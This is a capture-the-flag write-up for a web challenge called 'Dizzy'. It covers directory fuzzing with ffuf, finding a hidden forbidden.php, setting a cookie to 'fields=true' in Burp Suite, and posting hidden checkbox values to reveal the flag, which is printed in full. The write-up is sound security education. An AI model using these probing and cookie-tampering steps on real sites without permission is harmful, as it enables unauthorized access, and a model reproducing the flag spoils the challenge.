# Dizzy

# 1. Sitemap

We start by navigating to:
http://141.85.224.118:8081/

This returns a basic webpage or a 404. A typical next step is to find website map. We went to sitemap.xml at **http://141.85.224.118:8081/sitemap.xml**. This file revealed a list of internal paths such as:

```bash
/f
/v
/g
/r
/z
/n
/c
/k
/y
/forbidden
```

However, the IPs listed were incorrect (e.g. 141.85.224.114 instead of .118), so we manually tested all these routes using the correct host: **http://141.85.224.118:8081/<route>**

## 2. Discovering the File Extension via ffuf

We suspected that some files might be using extensions like .php, .txt etc. To confirm, we ran ffuf:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -O wordlist.txt
```

Then we ran:

```bash
ffuf -u http://141.85.224.118:8081/FUZZ -w wordlist.txt -e .php,.html,.txt -fc 404
```

This revealed a hidden route:

```bash
.htaccess.php           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 11ms]
.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 11ms]
.hta.txt                [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 11ms]
.hta                    [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 11ms]
.htaccess.html          [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 11ms]
.htaccess.txt           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 8ms]
.hta.php                [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 11ms]
.hta.html               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 11ms]
.htpasswd.php           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 8ms]
.htpasswd.txt           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 8ms]
.htpasswd.html          [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 7ms]
.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 8ms]
c.php                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 7ms]
f.php                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 6ms]
g.php                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 7ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 6ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 34ms]
k.php                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 6ms]
n.php                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 6ms]
r.php                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 8ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 7ms]
sitemap.xml             [Status: 200, Size: 2077, Words: 111, Lines: 75, Duration: 49ms]
v.php                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
y.php                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
z.php                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
:: Progress: [19000/19000] :: Job [1/1] :: 904 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

This was not visible in the sitemap and was key to progressing. So we said forbidden also had .php extension after noticed that each of the <letter>.php pages redirected in a loop from one to the other.

## 3. Discovering forbidden.php
The most interesting route was: **http://141.85.224.118:8081/forbidden.php**
It showed a simple HTML form:

```html
<form method="POST">
  <p><strong>Did you like SSS so far? </strong></p>
  <input type="checkbox" value="yes" name="yes" /> Loved it! <br />
  <input type="checkbox" value="no" name="no" /> Not really... :(<br />
  <p><input type="submit" value="Let's see" name="submit" /></p>
</form>
```

Hidden at the bottom (visibly styled away), we noticed:

```html
<div style="text-align: center; color:rgba(241,15,140,.15);">SSS{}</div>
```

Clearly, the flag will appear here somehow.

## 4. Modifying Cookies
Using Burp Suite, we noticed a cookie named:

```vbnet
Cookie: fields=false
```

We changed it to:

```vbnet
Cookie: fields=true
```
and resent the request. The server now returned some hidden inputs:

```html
<p style="margin-left:-18px; display: none;">
  <input type="checkbox" value="g" name="g" />
  <input type="checkbox" value="i" name="i" />
  <input type="checkbox" value="v" name="v" />
  <input type="checkbox" value="e" name="e" />
  <input type="checkbox" value="m" name="m" />
  <input type="checkbox" value="e" name="e" />
  <input type="checkbox" value="t" name="t" />
  <input type="checkbox" value="h" name="h" />
  <input type="checkbox" value="e" name="e" />
  <input type="checkbox" value="f" name="f" />
  <input type="checkbox" value="l" name="l" />
  <input type="checkbox" value="a" name="a" />
  <input type="checkbox" value="g" name="g" />
</p>
```

This spells out: **give me the flag**

## 5. Submitting Full Payload
The final POST request with all these checkboxes set and submitted it:

```bash
POST /forbidden.php HTTP/1.1
Host: 141.85.224.118:8081
Content-Length: 79
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://141.85.224.118:8081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://141.85.224.118:8081/forbidden.php
Accept-Encoding: gzip, deflate, br
Cookie: fields=true
Connection: keep-alive

yes=yes&submit=Let%27s+see
g=g&i=i&v=v&e=e&m=m&e=e&t=t&h=h&e=e&f=f&l=l&a=a&g=g
```

We received the flag inside the same hidden div:

```html
<div style="text-align: center; color:rgba(241,15,140,.15);">
  SSS{n0_m0re_c4rr0us3ls_f0r_m3}
</div>
```
